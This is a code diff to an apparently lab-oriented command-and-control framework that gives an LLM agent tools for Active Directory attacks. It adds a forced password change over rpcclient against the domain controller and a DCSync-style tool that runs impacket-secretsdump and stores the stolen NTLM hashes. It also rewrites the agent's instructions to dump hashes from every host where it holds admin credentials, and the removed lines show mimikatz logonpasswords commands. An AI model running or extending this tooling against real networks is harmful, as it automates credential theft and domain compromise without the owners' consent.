@@ -459,24 +459,64 @@ def c2_spray(agent_id: str, target_ip: str) -> str:
 
 
 @tool
-def c2_aclabuse(agent_id: str, operation: str, operation_args: str) -> str:
+def c2_aclabuse(agent_id: str, operation: str, operation_args: str, altuser: str = "", altpass: str = "") -> str:
     """
     Exploit an ACL misconfiguration.
     operation choices:
       addmember           <group> <user>
-      forcechangepassword <user> <newpassword>
+      forcechangepassword <user> <newpassword>   ← runs server-side via rpcclient
       genericwrite        <target> <attribute> <value>
       writedacl           <target> <principal> <right>
       writeowner          <target> <new_owner>
     operation_args: positional arguments as a space-separated string.
-    Example: operation='addmember', operation_args='Domain Admins backdoor'
+    altuser/altpass: credentials of the account that holds the ACL right (required for forcechangepassword).
+    Example: operation='forcechangepassword', operation_args='svc_backup NewP@ss!', altuser='helpdesk', altpass='PfeLab@2026!'
     Blocks up to 60 seconds.
     """
+    import subprocess as _sp
     valid_ops = {"addmember", "forcechangepassword", "genericwrite", "writedacl", "writeowner"}
     op = operation.lower().strip()
     if op not in valid_ops:
         return f"[-] Unknown operation '{op}'. Valid: {', '.join(valid_ops)}"
+
+    if op == "forcechangepassword":
+        # ADSI SetPassword uses wrong SAMR level — run via rpcclient server-side instead.
+        if not altuser or not altpass:
+            return "[error] forcechangepassword requires altuser and altpass (account with ForceChangePassword/GenericAll right)"
+        args = operation_args.split()
+        if len(args) < 2:
+            return "[error] forcechangepassword: operation_args must be '<user> <newpassword>'"
+        target_user, newpass = args[0], args[1]
+        hosts = _get("/hosts")
+        dc_ip = next(
+            (h["ip"] for h in hosts if isinstance(hosts, list) and "389" in h.get("open_ports", "").split(",")),
+            None
+        )
+        if not dc_ip:
+            return "[error] DC not found in hosts DB — run recon first"
+        agents = _get("/agents")
+        domain = "ICCN.local"
+        if isinstance(agents, list):
+            for a in agents:
+                hn = a.get("hostname", "")
+                if "." in hn:
+                    domain = ".".join(hn.split(".")[1:])
+                    break
+        cmd = ["rpcclient", f"-U{domain}/{altuser}%{altpass}", dc_ip,
+               "-c", f"setuserinfo2 {target_user} 23 '{newpass}'"]
+        print(f"  [aclabuse] forcechangepassword via rpcclient → {dc_ip} as {altuser}")
+        try:
+            result = _sp.run(cmd, capture_output=True, text=True, timeout=15)
+            combined = (result.stdout + result.stderr).strip()
+            if result.returncode == 0 and "NT_STATUS" not in combined:
+                return f"[+] Password changed for {target_user}"
+            return f"[-] rpcclient failed: {combined}"
+        except Exception as e:
+            return f"[error] rpcclient: {e}"
+
     instruction = op + "|" + "|".join(operation_args.split())
+    if altuser and altpass:
+        instruction += f"|{altuser}|{altpass}"
     res = _post("/task", {"agent_id": agent_id, "task_type": "aclabuse", "instruction": instruction})
     if "error" in res:
         return f"[error] {res['error']}"
@@ -574,6 +614,44 @@ def c2_generate_map(agent_id: str, output_path: str = "network_map.html") -> str
 
 
 @tool
+def c2_dcsync(target: str) -> str:
+    """
+    Run impacket-secretsdump server-side to dump all hashes from a target.
+    target format: domain/username:password@ip
+    Example: 'ICCN.local/svc_backup:Password@2026!@10.0.2.8'
+    NTLM hashes are automatically stored in the C2 credentials DB.
+    Call this whenever you have confirmed admin credentials for any remote host.
+    Blocks up to 2 minutes.
+    """
+    import subprocess as _sp, re as _re
+    print(f"  [dcsync] impacket-secretsdump {target}")
+    try:
+        result = _sp.run(
+            ["impacket-secretsdump", target],
+            capture_output=True, text=True, timeout=120
+        )
+        output = result.stdout + result.stderr
+        stored = 0
+        for ln in output.splitlines():
+            m = _re.match(r'^(?:[^\\:]+\\)?([^:]+):\d+:([a-f0-9]{32}):([a-f0-9]{32}):::', ln, _re.I)
+            if m:
+                uname, lm, nt = m.group(1), m.group(2), m.group(3)
+                _post("/credentials", {
+                    "username":    uname,
+                    "secret":      f"{lm}:{nt}",
+                    "cred_type":   "ntlm",
+                    "source_host": target.split("@")[-1],
+                })
+                stored += 1
+        out = output[:3000] + ("\n... (truncated)" if len(output) > 3000 else "")
+        return f"{out}\n[+] {stored} NTLM hash(es) stored in credentials DB"
+    except FileNotFoundError:
+        return "[error] impacket-secretsdump not found on the C2 server"
+    except _sp.TimeoutExpired:
+        return "[error] secretsdump timed out after 120s"
+
+
+@tool
 def c2_ask_human(question: str) -> str:
     """
     Ask the operator a question when clarification or explicit permission is needed
@@ -629,18 +707,19 @@ PHASE 4 — ATTACK EXECUTION (credential-driven, SharpHound-guided)
 Cross-reference the credentials from Phase 3 with the SharpHound analysis from Phase 2.
 Execute BOTH paths A and B whenever matches are found:
 
-  ── PATH A: LOCAL ADMIN → SECRETSDUMP ──────────────────────
+  ── PATH A: LOCAL ADMIN → DCSYNC ────────────────────────────
   For every LOCAL ADMIN relationship in the analysis output:
     1. Check if you have credentials in the DB for that admin user
-    2. If YES:
+    2. If YES and the target is NOT the agent's own machine:
        a. c2_authenticate(agent_id, username, password, target_ip, service)
           → verifies the credentials work on the target
-       b. If access confirmed → c2_run_secretsdump(agent_id, 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit')
-          → dumps credentials from the target machine
+       b. If access confirmed → c2_dcsync('domain/username:password@target_ip')
+          → dumps all hashes from that machine server-side via impacket-secretsdump
+          → NTLM hashes are stored in the DB automatically
        c. c2_get_credentials() → update your view of available creds
     Example: analysis says "jsmith → LOCAL ADMIN → CORPSRV01" and you have jsmith:Password1
       → c2_authenticate(agent_id, "jsmith", "Password1", "10.0.2.20", "winrm")
-      → c2_run_secretsdump(agent_id, "mimikatz.exe sekurlsa::logonpasswords exit")
+      → c2_dcsync("ICCN.local/jsmith:Password1@10.0.2.20")
 
   ── PATH B: ACL CHAIN → DOMAIN ADMIN ───────────────────────
   For every ATTACK PATH in the analysis output:
@@ -677,6 +756,7 @@ RULES
 - If a task fails or times out → skip it, continue to the next step.
 - Do NOT retry indefinitely.
 - The network map is auto-generated after c2_analyze_sharphound — do NOT call c2_generate_map during phases 1-3.
+- ALWAYS call c2_dcsync() when you have confirmed admin credentials for any host that is NOT the agent's own machine — do this for every such host including the DC.
 - Always end with c2_generate_map() at the very end of phase 4 for a final updated map.
 
 Current date/time: {datetime}
@@ -721,6 +801,7 @@ class C2Agent:
             c2_authenticate,
             c2_spray,
             c2_aclabuse,
+            c2_dcsync,
             c2_generate_map,
             c2_ask_human,
         ]
